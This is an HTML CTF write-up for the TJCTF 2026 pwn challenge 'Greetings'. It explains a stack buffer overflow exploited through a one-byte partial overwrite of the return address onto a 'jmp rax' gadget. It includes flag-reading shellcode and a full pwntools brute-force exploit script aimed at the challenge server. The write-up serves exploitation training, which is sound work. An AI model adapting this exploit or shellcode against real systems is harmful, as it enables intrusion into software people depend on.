@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+  <title>Greetings - Writeup</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="CTF Writeup">
+  <meta name="author" content="Cyber Saguaros">
+
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400|Josefin+Sans:300,400,600,700">
+  <link rel="stylesheet" href="/plugins/bootstrap/bootstrap.min.css">
+  <link rel="stylesheet" href="/plugins/themefisher-font/themefisher-font.min.css">
+  <link rel="stylesheet" href="/scss/style.min.css" media="screen">
+
+  <style>
+    body {
+      background:
+        radial-gradient(circle at top, rgba(203, 166, 247, 0.18), transparent 34%),
+        linear-gradient(180deg, #1e1e2e 0%, #181825 100%);
+      color: #cdd6f4;
+      font-family: 'Droid Serif', 'Josefin Sans', sans-serif;
+    }
+
+    header.navigation {
+      background-color: #181825;
+    }
+
+    /* Force navbar/link colors to match site header even if external CSS didn't load */
+    .navigation, .navbar {
+      background-color: #181825 !important;
+    }
+    .navbar-brand, .nav-link {
+      color: #cdd6f4 !important;
+    }
+    .nav-link:hover, .navbar-brand:hover {
+      color: #d8bafc !important;
+    }
+
+    .writeup-container {
+      max-width: 900px;
+      margin: 3rem auto;
+      background: rgba(24, 24, 37, 0.94);
+      border: 1px solid rgba(203, 166, 247, 0.18);
+      border-radius: 16px;
+      padding: 2rem;
+      box-shadow: 0 16px 50px rgba(0, 0, 0, 0.28);
+    }
+
+    .markdown-content {
+      color: rgba(205, 214, 244, 0.86);
+      line-height: 1.8;
+    }
+
+    .markdown-content h1 { color: #f5e0dc; font-size: 2.2rem; margin: 0 0 1rem; line-height: 1.2; border-bottom: 2px solid rgba(203,166,247,0.2); padding-bottom:1rem; }
+    .markdown-content h2 { color: #f5e0dc; font-size: 1.6rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(203,166,247,0.12); padding-bottom:0.5rem; }
+    .markdown-content h3 { color: #cba6f7; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+    .markdown-content p { margin-bottom: 1rem; }
+    .markdown-content code { background: rgba(0,0,0,0.3); color: #94e2d5; padding:0.2rem 0.5rem; border-radius:4px; font-family: 'Courier New', monospace; }
+    .markdown-content pre { background: rgba(0,0,0,0.4); border-left: 3px solid #cba6f7; padding:1rem; border-radius:6px; overflow-x:auto; margin:1rem 0; }
+    .markdown-content pre code { background:none; color:#89b4fa; padding:0; }
+    .markdown-content blockquote { border-left:4px solid #cba6f7; padding-left:1rem; color:rgba(205,214,244,0.76); font-style:italic; }
+    .markdown-content table { border-collapse: collapse; width:100%; margin:1rem 0; }
+    .markdown-content table th, .markdown-content table td { border:1px solid rgba(203,166,247,0.2); padding:0.75rem; text-align:left; }
+    .markdown-content table th { background: rgba(203,166,247,0.1); color:#f5e0dc; font-weight:700; }
+
+    footer.footer { background-color:#1e1e2e; color:#cdd6f4; padding:2rem 1rem; text-align:center; margin-top:3rem; border-top:1px solid rgba(203,166,247,0.12); }
+  </style>
+</head>
+
+<body>
+  <header class="navigation" style="background-color: #1e1e2e;">
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-dark">
+        <a class="navbar-brand" href="/">Cyber Saguaros</a>
+        <div class="collapse navbar-collapse">
+          <ul class="navbar-nav ml-auto">
+            <li class="nav-item"><a class="nav-link" href="/contact/">Contact</a></li>
+            <li class="nav-item"><a class="nav-link" href="/calendar/">Calendar</a></li>
+            <li class="nav-item"><a class="nav-link" href="/presentations/">Presentations</a></li>
+            <li class="nav-item"><a class="nav-link" href="/writeups/">Writeups</a></li>
+          </ul>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <div class="container">
+      <a href="/writeups/" class="back-link">← Back to Writeups</a>
+      <div class="writeup-container">
+        <div class="markdown-content">
+          <h1 id="greetings">Greetings</h1>
+<p><strong>Author:</strong> Jordan Lanham
+<strong>Event:</strong> TJCTF 2026
+<strong>Category:</strong> pwn
+<strong>Date:</strong> May 15, 2026
+<strong>Read Time:</strong> 6 minutes</p>
+<hr>
+<h2 id="overview">Overview</h2>
+<p>A small ELF binary that asks for a username size, then <code>fgets</code>&#39;s that many
+bytes into a 64-byte stack buffer.  The buffer is stack-resident, NX is off
+(<code>GNU_STACK</code> flags = RWX), and there is no stack canary.  PIE is enabled and
+<strong>no leak channel exists</strong> (fgets&#39;s mandatory NUL terminator bounds the only
+printf&#39;s output to bytes we already control).</p>
+<p>The intended trick is a <strong>1-byte partial overwrite of saved RIP to land on a
+<code>jmp rax</code> gadget at PIE_base + 0x10df</strong>.  Because fgets returns the address of
+its buffer in RAX -- and because choosing a first byte that isn&#39;t <code>&#39;@&#39;</code> skips
+the conditional printf and therefore preserves RAX -- the <code>jmp rax</code> lands
+directly on our shellcode on the executable stack.</p>
+<p>The partial overwrite succeeds in 1/16 of connections (random PIE nibble
+must equal 0xF for the carry math to match the target&#39;s byte 1), so we
+just retry until a flag-reading shellcode produces output.</p>
+<h2 id="challenge-description">Challenge Description</h2>
+<blockquote>
+<p>Greetings from TJ to you. Find the exploit, yes please do.
+nc tjc.tf 31373</p>
+</blockquote>
+<p><strong>Files provided:</strong> <code>greetings</code>, <code>libc.so.6</code>, <code>ld-linux-x86-64.so.2</code>,
+<code>greetings.c</code>, <code>Dockerfile</code>, <code>run.sh</code>, <code>flag.txt</code> (fake placeholder)
+<strong>Endpoints:</strong> <code>nc tjc.tf 31373</code></p>
+<h2 id="initial-analysis">Initial Analysis</h2>
+<p><code>checksec</code>:</p>
+<pre><code>Arch:       amd64-64-little
+RELRO:      Partial RELRO
+Stack:      No canary found
+NX:         NX unknown - GNU_STACK missing
+PIE:        PIE enabled
+Stack:      Executable
+RWX:        Has RWX segments
+</code></pre>
+<p><code>GNU_STACK</code> flags = 7 (RWX), so the stack is executable.</p>
+<p>Source (<code>greetings.c</code>):</p>
+<pre><code class="language-c">void greetUser() {
+    int uname_size;
+    char uname[64];
+    printf(&quot;Enter the size of your username: &quot;);
+    scanf(&quot;%d&quot;, &amp;uname_size);
+    getchar();
+    uname_size += 2;
+    printf(&quot;Enter username (start with @): &quot;);
+    fgets(uname, uname_size, stdin);
+    if (*(char *) uname == &#39;@&#39;) {
+        printf(&quot;Greetings to you: %s!&quot;, uname);
+    }
+}
+</code></pre>
+<p>Stack layout for <code>greetUser</code> (after <code>pushq %rbx; subq $0x50, %rsp</code>):</p>
+<pre><code>[rsp + 0x0c]  uname_size      (int, 4 bytes)
+[rsp + 0x10]  uname[64]       -- our 64-byte fgets target
+[rsp + 0x50]  saved %rbx
+[rsp + 0x58]  saved RIP       -- main+9 = PIE_base + 0x1089
+</code></pre>
+<p>So 72 bytes of pad before saved RIP -- plain stack BoF -- and a stack
+already marked executable.</p>
+<h2 id="solution-approach">Solution Approach</h2>
+<h3 id="step-1-find-a-usable-pie-relative-gadget">Step 1: Find a usable PIE-relative gadget</h3>
+<p>Disassembling the binary turns up two <code>jmp rax</code> instructions (the standard
+<code>ff e0</code> byte sequence) inside the compiler-emitted TM clone helpers:</p>
+<pre><code>0x10df    ff e0    jmp rax    (deregister_tm_clones)
+0x1120    ff e0    jmp rax    (register_tm_clones)
+</code></pre>
+<p>Both live well inside the executable text segment.</p>
+<h3 id="step-2-realise-rax--address-of-uname-after-fgets">Step 2: Realise RAX = address of uname after fgets</h3>
+<p><code>fgets</code> returns its buffer pointer in RAX per the SysV ABI.  In <code>greetUser</code>:</p>
+<pre><code>call fgets@plt           ; rax = uname (= rsp+0x10)
+cmpb $0x40, 0x10(%rsp)   ; if uname[0] == &#39;@&#39; ...
+je   .Lprintf            ; ... call printf  (clobbers rax)
+add $0x50, %rsp
+pop %rbx
+ret
+</code></pre>
+<p>The instructions between <code>fgets</code>&#39;s return and <code>ret</code> do not touch RAX <em>as long
+as we make uname[0] != &#39;@&#39;</em>.  Then ret -&gt; overwritten saved RIP, and if that
+overwrite lands on <code>jmp rax</code>, we jump straight to our buffer.  Stack is RWX,
+so the shellcode there executes.</p>
+<h3 id="step-3-1-byte-partial-overwrite-math">Step 3: 1-byte partial overwrite math</h3>
+<p>Saved RIP at greetUser&#39;s <code>ret</code> is <code>base + 0x1089</code> (main+9, where main resumes
+after <code>call greetUser</code>).  PIE base is page-aligned: <code>base = ...X000</code> with
+random nibble X in bits 12..15.  Bytes (LE):</p>
+<pre><code>saved RIP original = [0x89, ((X+1)&lt;&lt;4) mod 256, b2 + carry, b3, b4, b5, b6, b7]
+</code></pre>
+<p>When we send exactly 73 chars to fgets (uname_size = 72, so n = 74, fgets
+reads up to 73 chars), the last byte we write lands at <code>uname[72]</code> = saved
+RIP byte 0, and fgets places its mandatory NUL at <code>uname[73]</code> = saved RIP
+byte 1.  We choose payload byte 72 = <code>0xdf</code> (low byte of our target 0x10df).
+After the write:</p>
+<pre><code>saved RIP final = [0xdf, 0x00, b2 + carry, b3, b4, b5, b6, b7]
+</code></pre>
+<p>Target <code>base + 0x10df</code> (low 16 bits = 0x10df with byte 0 = 0xdf, byte 1 = 0x10):</p>
+<pre><code>target = [0xdf, ((X+1)&lt;&lt;4 + 0x10) mod 256, b2 + carry, b3, b4, b5, b6, b7]
+</code></pre>
+<p>The two match iff <code>((X+1)&lt;&lt;4 + 0x10) mod 256 == 0x00</code>, i.e. <code>((X+1)&lt;&lt;4) == 0xF0</code>
+and a carry takes byte 1 to 0x00 -- which happens exactly when <strong>X = 0xF</strong>.
+Byte 2&#39;s carry-from-byte-1 is then identical in both arithmetic chains, so
+byte 2 also matches automatically.</p>
+<p>Probability per connection: 1/16.</p>
+<h3 id="step-4-shellcode-that-opens-flagtxt">Step 4: Shellcode that opens /flag.txt</h3>
+<p>A small under-64-byte shellcode that does <code>open(&quot;/flag.txt&quot;) -&gt; read -&gt; write -&gt; exit</code>:</p>
+<pre><code class="language-asm">lea rdi, [rip+path]     ; &quot;/flag.txt\0&quot;
+xor esi, esi
+xor edx, edx
+push 2              ; SYS_open
+pop rax
+syscall                 ; rax = fd
+
+mov rdi, rax
+mov rsi, rsp
+push 0x100
+pop rdx
+xor eax, eax            ; SYS_read
+syscall                 ; rax = bytes read
+
+mov rdx, rax
+mov rsi, rsp
+push 1
+pop rdi
+push 1                  ; SYS_write
+pop rax
+syscall
+
+push 0x3c               ; SYS_exit
+pop rax
+xor edi, edi
+syscall
+
+path: .ascii &quot;/flag.txt\0&quot;
+</code></pre>
+<p>Comes out at 63 bytes -- just under 64, so it fits in <code>uname[0..62]</code>, with
+one slot of NOP filler before the 8-byte rbx pad and the single saved-RIP
+partial-overwrite byte.</p>
+<h2 id="code--exploit">Code / Exploit</h2>
+<p><code>_workspace/sol_greetings_v4.py</code>:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+import sys, time
+
+HOST, PORT = &#39;tjc.tf&#39;, 31373
+context.arch = &#39;amd64&#39;
+context.log_level = &#39;error&#39;
+
+sc = asm(r&#39;&#39;&#39;
+    lea rdi, [rip+path]
+    xor esi, esi
+    xor edx, edx
+    push 2 ; pop rax
+    syscall
+    mov rdi, rax
+    mov rsi, rsp
+    push 0x100 ; pop rdx
+    xor eax, eax
+    syscall
+    mov rdx, rax
+    mov rsi, rsp
+    push 1 ; pop rdi
+    push 1 ; pop rax
+    syscall
+    push 0x3c ; pop rax
+    xor edi, edi
+    syscall
+path: .ascii &quot;/flag.txt\0&quot;
+&#39;&#39;&#39;)
+assert len(sc) &lt;= 64
+PAYLOAD = sc.ljust(64, b&#39;\x90&#39;) + b&#39;B&#39; * 8 + b&#39;\xdf&#39;   # 73 bytes total
+assert PAYLOAD[0] != 0x40  # uname[0] must NOT be &#39;@&#39; so RAX survives
+
+def try_once():
+    try:
+        io = remote(HOST, PORT, timeout=3)
+    except Exception:
+        return b&#39;&#39;
+    try:
+        io.recvuntil(b&#39;: &#39;, timeout=2)
+        io.sendline(b&#39;72&#39;)                 # uname_size; +2 -&gt; fgets n=74 -&gt; reads 73 chars
+        io.recvuntil(b&#39;: &#39;, timeout=2)
+        io.send(PAYLOAD)                   # NO newline
+        time.sleep(0.3)
+        try: return io.recvall(timeout=2)
+        except Exception: return b&#39;&#39;
+    finally:
+        try: io.close()
+        except: pass
+
+for i in range(500):
+    out = try_once()
+    if b&#39;tjctf{&#39; in out:
+        print(out.decode(&#39;latin-1&#39;, errors=&#39;replace&#39;))
+        sys.exit(0)
+    if (i + 1) % 16 == 0:
+        print(f&#39;... {i+1} attempts&#39;, file=sys.stderr)
+</code></pre>
+<p>Run output (hit on attempt #N with N ~&lt; 30 typical):</p>
+<pre><code>$ python3 sol_greetings_v4.py
+... 16 attempts
+=== FLAG ===
+Enter username (start with @): tjctf{rAx_h01ds_r3t_v@lS?_189278}
+</code></pre>
+<h2 id="technical-details">Technical Details</h2>
+<ul>
+<li><strong>Vulnerability class:</strong> stack-based buffer overflow (no canary)</li>
+<li><strong>Mitigations:</strong> PIE enabled, partial RELRO, executable stack (RWX in
+<code>PT_GNU_STACK</code>), no canary.</li>
+<li><strong>Primitive:</strong> <code>fgets(buf, uname_size+2, stdin)</code> with attacker-controlled
+<code>uname_size</code> writes past saved RIP.</li>
+<li><strong>Key trick:</strong> <code>fgets</code> returns its buffer pointer in RAX.  By making
+<code>uname[0] != &#39;@&#39;</code> we skip the conditional printf, so RAX survives all the
+way to greetUser&#39;s <code>ret</code>.  A 1-byte partial overwrite redirecting saved
+RIP to the <code>jmp rax</code> gadget at PIE+0x10df then jumps straight to our
+shellcode on the executable stack.</li>
+<li><strong>Why exactly 1 byte:</strong> fgets places its terminator NUL at the byte
+immediately after the last data byte.  Writing 73 bytes makes that NUL
+land on saved RIP byte 1, which we WANT to be zero in the lucky case.</li>
+<li><strong>Probability:</strong> PIE base <code>...X000</code> matches the target&#39;s byte 1 only when
+X = 0xF (carries identically through bytes 1-&gt;2 for both saved-RIP-original
+and target-address).  1/16 per connection.</li>
+</ul>
+<h2 id="key-insights">Key Insights</h2>
+<ul>
+<li><strong>fgets&#39;s mandatory NUL is a feature, not just a bug</strong>: by sending exactly
+N bytes (no newline), the NUL goes at byte N -- which is <em>exactly</em> what we
+want for a 1-byte partial overwrite of saved RIP that needs the high byte
+zeroed.  Stop trying to defeat the NUL; design around it.</li>
+<li><strong>RAX is preserved across non-clobbering instruction sequences after a
+function returns into rax</strong>.  A skip-the-printf branch (<code>uname[0] != &#39;@&#39;</code>)
+is what makes the <code>jmp rax</code> gadget chain to a buffer we just controlled.</li>
+<li><strong>PIE bits 12..15 leak via crashes</strong>: 1/16 attempts return non-segfault
+output.  When you have no leak, you DO have the ability to differentiate
+base nibble values by ret-target -- if your gadget has the right
+arithmetic alignment (carry semantics on byte 1), one nibble value
+succeeds and the rest crash.  Treat it as a 1/16 brute force.</li>
+<li><code>__isoc23_scanf(&quot;%d&quot;, ...)</code> truncates large integers to 32-bit instead of
+reporting overflow; useful to remember even though this exploit didn&#39;t
+end up needing huge sizes.</li>
+</ul>
+<h2 id="the-flag">The Flag</h2>
+<pre><code>tjctf{rAx_h01ds_r3t_v@lS?_189278}
+</code></pre>
+<h2 id="resources">Resources</h2>
+<ul>
+<li><a href="https://elixir.bootlin.com/glibc/glibc-2.42/source/libio/iofgets.c">glibc 2.42 fgets source</a></li>
+<li><a href="https://docs.pwntools.com/">pwntools docs</a></li>
+<li><a href="https://docs.pwntools.com/en/stable/shellcraft.html">Shellcraft / pwntools shellcode</a></li>
+<li><a href="https://github.com/ChrisTheCoolHut/pwn_brute">PIE / ASLR brute force tactics</a></li>
+<li><a href="https://github.com/redpwn/jail">pwn.red/jail challenge runtime</a></li>
+</ul>
+
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="container">
+      <p>&copy; 2024-2026 Cyber Saguaros. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <script src="/plugins/jquery/jquery.js"></script>
+  <script src="/plugins/bootstrap/bootstrap.min.js"></script>
+</body>
+</html>
